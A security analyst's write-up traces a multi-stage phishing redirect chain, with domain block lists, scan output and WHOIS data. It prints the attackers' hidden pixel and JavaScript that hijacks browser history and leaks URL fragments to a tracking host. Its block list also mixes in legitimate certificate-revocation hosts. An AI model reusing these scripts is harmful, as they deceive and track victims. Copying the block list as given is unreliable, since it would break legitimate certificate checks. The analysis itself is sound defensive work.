# talrezew

## Analysis

    Filip Pynckels
    Oct 29th, 2024

## Proposition

#### Primary security measures

    Block network trafic to and from 139.45.197.244
    Block network trafic to and from talrezew.net
    Block network trafic to and from my.rtmark.net
    Block network trafic to and from fooshoafoat.com
    Block network trafic to and from r11.o.lencr.org
    Block network trafic to and from ormedion.com
    Block network trafic to and from ocsp.r2m03.amazontrust.com
    Block network trafic to and from account.linktrust.com
    Block network trafic to and from r10.o.lencr.org

#### Secundary security measures

    Block network trafic to and from 34.117.79.165
    Block network trafic to and from hb6trk.com
    Block network trafic to and from www.hb6trk.com
    Block network trafic to and from www.nova360space.com
    Block network trafic to and from www.nowclickithere.com
    Block network trafic to and from www.p0stb4ck.com
    Block network trafic to and from www.misterloading.com
    Block network trafic to and from www.surprisinglyfastr.com
    Block network trafic to and from www.484tr4ck.com
    Block network trafic to and from www.lpminglemesh.com
    Block network trafic to and from www.muchostr4ffic.com
    Block network trafic to and from www.solidtr4ffic.com
    Block network trafic to and from www.loadingspeedfast.com
    Block network trafic to and from www.pvcryu7trk.com
    Block network trafic to and from www.lphorizonhive.com
    Block network trafic to and from www.surgetr4ffic.com
    Block network trafic to and from www.redirected-successfully.com
    Block network trafic to and from www.worldofclicks.net
    Block network trafic to and from www.plhv2trk.com
    Block network trafic to and from www.trafficseason.info
    Block network trafic to and from www.sendtr4ffic.com
    Block network trafic to and from www.internettr4ffic.com
    Block network trafic to and from www.lpnovanet.com
    Block network trafic to and from www.supertr4ffic.com
    Block network trafic to and from www.universeofclicks.com
    Block network trafic to and from www.highqualitylinkclicks.com
    Block network trafic to and from www.craftybyte42.com

## 1. Attack vector

    A Phishing mail is sent to the potential victim.

    When the victim clicks the link a page that seems legitimate is shown. However, when the user revisits the page by means of clicking on the browser history entry of this page, the browser is redirected to a 'You won a gift' page.

    But this is not the end. The mentioned page redirects to a malicious page in the Netherlands (Amsterdam).

## 2. Analysis of the first stage of the attack

#### 2.1 eMail

    On first sight, the mail contains nothing problematic, except for the following html fragment:

        <img style="display: none" src="http://frthi.trophytakers.com/4a0aeqv2yzcpuog0bsqusxg7wk3ayfwv7lg3lsxhqk7svngsrwxdu33h33o3wvdsdrsjinos5jOUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/f3xnsg0w3ni/ICRNwMNKT9gqe171BRQJh6WpKmDPrqk1BHqzr8Jz0mPY/780564350873669074167519828050420/1xnLjmMeCkxuuqWu87ec98DKMSkD4uWSIIBGMCfjypHc" />

        <a href="https://www.nwwdeest.org/foyfnkfrnosexli" style="text-decoration: none;color:white;">n</a>	
        <p><a href="http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286" style="display: inline-block; padding: 10px 10px; background-color:#ff8000; color: #ffffff; text-decoration: none; border-radius: 15px; font-size: 30px;"> COntroler het afleveraddres</a></p>
        <a href="https://www.emerfggm.org/tycgznqffbyujiq" style="text-decoration: none;color:white;">n</a>

    At the day of analysis, the following url was active:

        http://frthi.trophytakers.com

    The following urls were not active:

        https://www.emerfggm.org
        https://www.nwwdeest.org

    The link in the `img` tag points to a png. More precise: PNG image data, 1 x 1, 8-bit gray+alpha, non-interlaced.
    
    The link in the `a` tag points to a html snippet: HTML document, ASCII text, with CRLF line terminators.

#### 2.2 HTML code snippet

    The HTML code snippet is the following:

        <noscript>
        <meta http-equiv="refresh" content="0;url=http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286?r=1">
        </noscript>
        <script>
            url = "http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286";
            hash = window.location.hash.replace('#', '');
            if(hash.length > 0) {
                location.replace(url + "?in=1&ke="+hash);
            } else {
                location.replace(url + "?in=1");
            }
        </script>

    This is kind of a recursive loading of the same code snippet with a appended parameters that give information to the server.
    
    The link is:

        http://frthi.trophytakers.com/6lbwpddvkvw4mngysvqpid9uRUXd0VmZDTmRQOVhxcXRmdDVkanAtNjktMjYxNTUxOTMtMGI2YzAyMTAtMTkxLUR4c3M5d3Y1WUtTb2R6ZGZPUDdG/av3liky0d1z/kfry0mWhDKsY98/172792207251798562080957212313286
    
    The respective parameters are:

        ?r=1
        ?in=1
        ?in=1&ke="+hash

    The `r=1` parameter/Value recurses on the same code snippet.

    The `in=1` parameter/value gets a new HTML file/page: HTML document, Unicode text, UTF-8 text, with very long lines (368), with CRLF line terminators

#### 2.3 HTML page

    The HTML page towards the browser is redirected uses a number of legitimate links, like:

        http://www.w3.org
        https://use.fontawesome.com
        https://virtualpushplatform.com

    It includes legitimate code snippets, like the one defining the function `ddddtttss(ddd)` and the one at the bottom that adds an event listener to the `button1` button.

    It also downloads the same code snippet as shown in point 2.2 above, under a different name: ./js/script/js

    There are, however, also two new code snippets that must be analyzed:

#### 2.4 Code snippet

    This code snippet is located at line 13 of the HTML file. It is a self executing function.

        <script>
            (function (window, location) {
                var redirect = "https://www.hb6trk.com/K31267/9WDPQ6B/"
                var currentUrl = location.origin + location.pathname + location.search;
                if (location.hash !== "#!/hst") {
                    history.replaceState(null, document.title, currentUrl + "#!/hst");
                    history.pushState(null, document.title, currentUrl);
                }

                window.addEventListener("popstate", function () {
                    if (location.hash === "#!/hst") {
                        setTimeout(function () {
                            window.location.replace(redirect);
                        }, 0);
                    }
                }, false);
            }(window, location));
        </script>

    To make a long story short: when the user goes to the browser history and clicks on the history of the HTML page, the browser is redirected to the url:

        https://www.hb6trk.com/K31267/9WDPQ6B/

## 3. Server of the first stage of the attack

#### 3.1 URL

    https://www.hb6trk.com/K31267/9WDPQ6B/

#### 3.2 IP (ping)

    34.117.79.165 (165.79.117.34.bc.googleusercontent.com)

#### 3.3 Open ports (masscan / nmap -sV -sC --version-intensity 9 34.117.79.165 -p <port> )

    Nmap scan report for 165.79.117.34.bc.googleusercontent.com (34.117.79.165)

    PORT    STATE SERVICE   VERSION

    80/tcp  open  http      nginx
    |_http-server-header: nginx
    |_http-title: Performance Marketing Platform

    443/tcp open  ssl/https nginx
    |_  http/1.1
    | ssl-cert: Subject: commonName=hb6trk.com
    | Not valid before: 2024-10-10T14:41:48
    |_Not valid after:  2025-05-23T16:00:41
    |_http-title: Performance Marketing Platform
    |_ssl-date: TLS randomness does not represent time
    |_http-server-header: nginx

    2 services unrecognized despite returning data.     

    Aggressive OS guesses:
        Crestron XPanel control system (89%)
        FreeBSD 11.0-CURRENT (87%)
        FreeBSD 7.0-RELEASE (87%)
        Epson Stylus Pro 400 printer (87%)
        FreeBSD 8.2-RELEASE (86%)
        FreeBSD 10.2-RELEASE (86%)
        FreeBSD 11.0-RELEASE (86%)
        FreeBSD 11.0-STABLE (86%)
        FreeBSD 11.1-RELEASE (86%)
        FreeBSD 11.1-STABLE (86%)

#### 3.4 Location (https://www.ip2location.com/demo/34.117.79.165)

    IP               Country                   Region      City         ISP               Domain            Coordinates (N,W)
    34.117.79.165    United States of America  Missouri    Kansas City  Google LLC        google.com        39.099730, -94.578570 (39°5'59"N   94°34'43"W)

#### 3.5 Other malicious url's pointing to the same server:

    34.117.79.165
    hb6trk.com
    www.hb6trk.com
    www.nova360space.com
    www.nowclickithere.com
    www.p0stb4ck.com
    www.misterloading.com
    www.surprisinglyfastr.com
    www.484tr4ck.com
    www.lpminglemesh.com
    www.muchostr4ffic.com
    www.solidtr4ffic.com
    www.loadingspeedfast.com
    www.pvcryu7trk.com
    www.lphorizonhive.com
    www.surgetr4ffic.com
    www.redirected-successfully.com
    www.worldofclicks.net
    www.plhv2trk.com
    www.trafficseason.info
    www.sendtr4ffic.com
    www.internettr4ffic.com
    www.lpnovanet.com
    www.supertr4ffic.com
    www.universeofclicks.com
    www.highqualitylinkclicks.com
    www.craftybyte42.com

#### 3.6 robots.txt

    No robots.txt file available

#### 3.7 Other server information (https://stat.ripe.net/app/launchpad/S1_34.117.79.165)

    34.117.79.165 was not found on any blocklist
    Abuse contact: google-cloud-compliance@google.com
    
## 4. Analysis of the second stage of the attack

    When getting the file from:
    
        https://www.hb6trk.com/K31267/9WDPQ6B/

    it looks like a publicity popup script. However, when getting the file from
    
        wget https://bbmediavip.com/click.php?key=d0bjrnj6r38ifd9fi1zx

    the browser is redirected to
    
        https://talrezew.net/4/4654468?var=D

## 5. Server of the second stage of the attack

#### 5.1 URL

    https://talrezew.net/4/4654468

#### 5.2 IP (ping)

    139.45.197.244

#### 5.3 Open ports (masscan / nmap -sV -sC --version-intensity 9 34.117.79.165 -p <port> )

    Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-10-29 15:12:15 GMT
    Initiating SYN Stealth Scan
    Scanning 1 hosts [65535 ports/host]
    Discovered open port 80/tcp on 139.45.197.244                                  

    PORT   STATE SERVICE VERSION
    80/tcp open  http    nginx
    |_http-title: 403 Forbidden

    Aggressive OS guesses:
        Crestron XPanel control system (89%)
        ASUS RT-N56U WAP (Linux 3.4) (87%)
        Linux 3.1 (87%), Linux 3.16 (87%)
        Linux 3.2 (87%)
        HP P2000 G3 NAS device (87%)
        AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%)
        MikroTik RouterOS 6.0 (86%)
        Linux 4.10 (86%)

    No exact OS matches for host (test conditions non-ideal).

#### 5.4 Location (https://www.ip2location.com/demo/34.117.79.165)

    IP               Country       Region         City         ISP               Domain     Coordinates (N,W)
    139.45.197.244   Netherlands   Noord-Holland  Amsterdam    RETN Limited      retn.net   52.378500, 4.899980 (52°22'43"N   4°53'60"E)

#### 5.5 Other malicious url's pointing to the same server:

    139.45.197.244
    talrezew.net

#### 5.6 robots.txt

    No robots.txt file available
    
    HTTP request sent, awaiting response... 403 Forbidden
    2024-10-29 16:18:17 ERROR 403: Forbidden.

#### 5.7 Other server information (https://stat.ripe.net/app/launchpad/S1_139.45.197.244)

    139.45.197.244 was not found on any blocklist
    Abuse contact: claims@networkclaim.com
    
## 6. Analysis of the third stage of the attack

#### 6.1 URLs

    The URL mentioned in point 5.1 loads a HTML page that executes an elaborate obfuscated script that calls the following URL's when executed on a Raspberry Pi:

    http://talrezew.net/sftouch?userId=008104eb447a4129f7b04a20f821c957&z=4654468&p_rid=ae145dbe-e2a2-44cf-9d51-629d2252c992&p_src=sf&branchId=0&rb=sztYDr1txxIYI5kk0ytUgI3ClC9_JzU0AidVMVzC3X3ViuPDQVmVk--ZPbbW5zQ14VbXvAU4WYpOIWGlDmCER235RjSwHoILmJC9JlKYkMH47QKXrjsYbB9C1VhrswViUr0gDxEPC-dAeBR8zmxmAuRr85flCBJ0bR_wZuGTT8v65xru&w_img=1

    http://talrezew.net/log/add?cid=1db9169f-90f4-4b2d-b517-bc47aab19c1f&ruid=ae145dbe-e2a2-44cf-9d51-629d2252c992

    http://talrezew.net/async_log/add?cid=1db9169f-90f4-4b2d-b517-bc47aab19c1f&ruid=ae145dbe-e2a2-44cf-9d51-629d2252c992

    http://talrezew.net/?z=4654468&syncedCookie=true&rhd=false

    https://my.rtmark.net/img.gif?f=merge&userId=008104eb447a4129f7b04a20f821c957&z=4654468&p_rid=ae145dbe-e2a2-44cf-9d51-629d2252c992&p_src=sf

#### 6.2 WhoIs

    Domain Name: TALREZEW.NET
    Registry Domain ID: 2912931623_DOMAIN_NET-VRSN
    Registrar WHOIS Server: whois.pananames.com
    Registrar URL: http://www.pananames.com
    Updated Date: 2024-08-31T22:30:07Z
    Creation Date: 2024-08-31T22:30:05Z
    Registrar Registration Expiration Date: 2025-08-31T22:30:05Z
    Registrar: URL SOLUTIONS INC.
    Registrar IANA ID: 1449
    Registrar Abuse Contact Email: abuse@pananames.com
    Registrar Abuse Contact Phone: +1.4692250522
    Reseller: 
    Domain Status: clientTransferProhibited -- https://icann.org/epp#clientTransferProhibited
    Registry Registrant ID:
    Registrant Name: Private Whois
    Registrant Organization: GLOBAL DOMAIN PRIVACY SERVICES INC
    Registrant Street: Tower Financial Center Flr 35, 50th St y E. Mendez St
    Registrant City: Panama
    Registrant State/Province: NA
    Registrant Postal Code: NA
    Registrant Country: PA
    Registrant Phone: +1.4692250522
    Registrant Phone Ext: 
    Registrant Fax: 
    Registrant Fax Ext: 
    Registrant Email: talrezew.net.x4woseufnjfg@domains-anonymizer.com
    Registry Admin ID:
    Admin Name: Private Whois
    Admin Organization: GLOBAL DOMAIN PRIVACY SERVICES INC
    Admin Street: Tower Financial Center Flr 35, 50th St y E. Mendez St
    Admin City: Panama
    Admin State/Province: NA
    Admin Postal Code: NA
    Admin Country: PA
    Admin Phone: +1.4692250522
    Admin Phone Ext: 
    Admin Fax: 
    Admin Fax Ext: 
    Admin Email: admin.talrezew.net.x4woseufnjfg@domains-anonymizer.com
    Registry Tech ID:
    Tech Name: Private Whois
    Tech Organization: GLOBAL DOMAIN PRIVACY SERVICES INC
    Tech Street: Tower Financial Center Flr 35, 50th St y E. Mendez St
    Tech City: Panama
    Tech State/Province: NA
    Tech Postal Code: NA
    Tech Country: PA
    Tech Phone: +1.4692250522
    Tech Phone Ext: 
    Tech Fax: 
    Tech Fax Ext: 
    Tech Email: tech.talrezew.net.x4woseufnjfg@domains-anonymizer.com
    Name Server: NS-1150.AWSDNS-15.ORG
    Name Server: NS-1635.AWSDNS-12.CO.UK
    Name Server: NS-215.AWSDNS-26.COM
    Name Server: NS-825.AWSDNS-39.NET
    DNSSEC: Unsigned
    >>> Last update of WHOIS database: 2024-08-31T22:30:07Z <<<

    Domain Name: RTMARK.NET
    Registry Domain ID: 1882699297_DOMAIN_NET-VRSN
    Registrar WHOIS Server: whois.pananames.com
    Registrar URL: http://www.pananames.com
    Updated Date: 2024-09-29T06:03:42Z
    Creation Date: 2014-10-29T10:13:55Z
    Registrar Registration Expiration Date: 2025-10-29T10:13:55Z
    Registrar: URL SOLUTIONS INC.
    Registrar IANA ID: 1449
    Registrar Abuse Contact Email: abuse@pananames.com
    Registrar Abuse Contact Phone: +1.4692250522
    Reseller: 
    Domain Status: clientTransferProhibited -- https://icann.org/epp#clientTransferProhibited
    Registry Registrant ID:
    Registrant Name: REDACTED FOR PRIVACY
    Registrant Organization: REDACTED FOR PRIVACY
    Registrant Street: REDACTED FOR PRIVACY
    Registrant City: REDACTED FOR PRIVACY
    Registrant State/Province: REDACTED FOR PRIVACY
    Registrant Postal Code: REDACTED FOR PRIVACY
    Registrant Country: REDACTED FOR PRIVACY
    Registrant Phone: REDACTED FOR PRIVACY
    Registrant Phone Ext: REDACTED FOR PRIVACY
    Registrant Fax: REDACTED FOR PRIVACY
    Registrant Fax Ext: REDACTED FOR PRIVACY
    Registrant Email: rtmark.net.25ece6hhghx30@domains-anonymizer.com
    Registry Admin ID:
    Admin Name: REDACTED FOR PRIVACY
    Admin Organization: REDACTED FOR PRIVACY
    Admin Street: REDACTED FOR PRIVACY
    Admin City: REDACTED FOR PRIVACY
    Admin State/Province: REDACTED FOR PRIVACY
    Admin Postal Code: REDACTED FOR PRIVACY
    Admin Country: REDACTED FOR PRIVACY
    Admin Phone: REDACTED FOR PRIVACY
    Admin Phone Ext: REDACTED FOR PRIVACY
    Admin Fax: REDACTED FOR PRIVACY
    Admin Fax Ext: REDACTED FOR PRIVACY
    Admin Email: admin.rtmark.net.25ece6hhghx30@domains-anonymizer.com
    Registry Tech ID:
    Tech Name: REDACTED FOR PRIVACY
    Tech Organization: REDACTED FOR PRIVACY
    Tech Street: REDACTED FOR PRIVACY
    Tech City: REDACTED FOR PRIVACY
    Tech State/Province: REDACTED FOR PRIVACY
    Tech Postal Code: REDACTED FOR PRIVACY
    Tech Country: REDACTED FOR PRIVACY
    Tech Phone: REDACTED FOR PRIVACY
    Tech Phone Ext: REDACTED FOR PRIVACY
    Tech Fax: REDACTED FOR PRIVACY
    Tech Fax Ext: REDACTED FOR PRIVACY
    Tech Email: tech.rtmark.net.25ece6hhghx30@domains-anonymizer.com
    Name Server: NS01.RTMARK.NET
    Name Server: NS11.RTMARK.NET
    Name Server: NS21.RTMARK.NET
    DNSSEC: Unsigned
    >>> Last update of WHOIS database: 2024-09-29T06:03:42Z <<<

#### 6.3 Rtmark.net

    The URL rtmark.net points to

        https://s3-eu-west-1.amazonaws.com

    And mentions the name

        Samoukale

    It is mentioned by the urlquery.net site as "a monster under the bed"

        https://urlquery.net/report/a8b665ee-7d89-4974-ab6d-760484e4231c

    together with some other URLs like there are

        fooshoafoat.com
        r11.o.lencr.org
        ormedion.com
        ocsp.r2m03.amazontrust.com
        account.linktrust.com
        r10.o.lencr.org

#### 6.4.2 Talrezew.net HTML

    TO BE CONTINUED...
